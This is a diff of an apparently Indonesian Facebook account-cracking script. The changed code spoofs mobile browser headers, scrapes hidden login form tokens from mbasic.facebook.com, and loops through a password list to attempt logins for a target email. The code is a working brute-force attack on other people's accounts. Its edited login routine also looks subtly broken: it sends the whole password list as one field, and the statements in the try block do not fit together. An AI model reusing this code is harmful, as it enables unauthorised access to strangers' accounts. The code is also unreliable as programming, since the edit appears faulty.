@@ -38,15 +38,15 @@ Dump = []
 def banner_logo():
     os.system('cls' if os.name == 'nt' else 'clear') 
     Console(width=80, style="bold hot_pink2").print(Panel("""
-    [bold green] _______           ______   _______  _                 ______  
-    [bold green](  ____ )|\     /|(  __  \ (  ___  )( \      |\     /|(  __  \ 
-    [bold green]| (    )|| )   ( || (  \  )| (   ) || (      ( \   / )| (  \  )
-    [bold green]| (____)|| |   | || |   ) || (___) || | _____ \ (_) / | |   ) |
-    [bold green]|     __)| |   | || |   | ||  ___  || |(_____) ) _ (  | |   | |
-    [bold green]| (\ (   | |   | || |   ) || (   ) || |       / ( ) \ | |   ) |
-    [bold green]| ) \ \__| (___) || (__/  )| )   ( || (____/\( /   \ )| (__/  )
-    [bold green]|/   \__/(_______)(______/ |/     \|(_______/|/     \|(______/ 
-    """, title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
+[bold green] _______           ______   _______  _                 ______  
+[bold green](  ____ )|\     /|(  __  \ (  ___  )( \      |\     /|(  __  \ 
+[bold green]| (    )|| )   ( || (  \  )| (   ) || (      ( \   / )| (  \  )
+[bold green]| (____)|| |   | || |   ) || (___) || | _____ \ (_) / | |   ) |
+[bold green]|     __)| |   | || |   | ||  ___  || |(_____) ) _ (  | |   | |
+[bold green]| (\ (   | |   | || |   ) || (   ) || |       / ( ) \ | |   ) |
+[bold green]| ) \ \__| (___) || (__/  )| )   ( || (____/\( /   \ )| (__/  )
+[bold green]|/   \__/(_______)(______/ |/     \|(_______/|/     \|(______/ 
+""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
     return 0
 ### DAPATKAN NAMA ###
 def dapatkan_nama(cookie, token_eaag):
@@ -327,29 +327,36 @@ class crack:
                 self.useragent = self.realme_useragent(total = 1)
                 with requests.Session() as r:
                     r.headers.update({
-			    'host': 'mbasic.facebook.com',
+                'Host': 'mbasic.facebook.com',
 			    'cache-control': 'max-age=0',
-			    'upgrade-insecure-requests': '1',
-			    'origin': 'https://mbasic.facebook.com',
-			    'content-type': 'application/x-www-form-urlencoded',
-			    'user-agent': self.useragent,
-			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			    'sec-fetch-site': 'same-origin',
-			    'sec-fetch-mode': 'cors',
-			    'sec-fetch-user': 'empty',
-			    'sec-fetch-dest': 'document',
-			    'referer': 'https://mbasic.facebook.com/login/?email=',
-			    'accept-encoding':'gzip, deflate br',
-			    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+                'upgrade-insecure-requests': '1',
+                'origin': 'https://mbasic.facebook.com',
+                'content-type': 'application/x-www-form-urlencoded',
+                'user-agent': self.useragent,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-user': 'empty',
+                'sec-fetch-dest': 'document',
+                'referer': 'https://mbasic.facebook.com/login/?email='+email,
+                'accept-encoding':'gzip, deflate br',
+                'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
                     response = r.get('https://m.alpha.facebook.com/login.php?').text
                     try:
-                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
-                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
-                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
-                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
-                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
-                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
-                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
+                        ua = random.choice(ugen)
+                        ua2 = random.choice(ugen2)
+                        ses = requests.Session()
+                        for pw in pws:
+                            tix = time.time()
+                            ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+                            p = ses.get('https://mbasic.facebook.com/login/?email='+email).text
+                            dataa ={
+                        'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
+                        'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
+                        'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
+                        'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
+                        'email':email,
+                        'pass':pws}
                     except (AttributeError) as e:
                         Console().print("[bold hot_pink2]   ╰─>[bold red] Terjadi Kesalahan!                    ", end='\r');time.sleep(2.0);continue
                     data = {
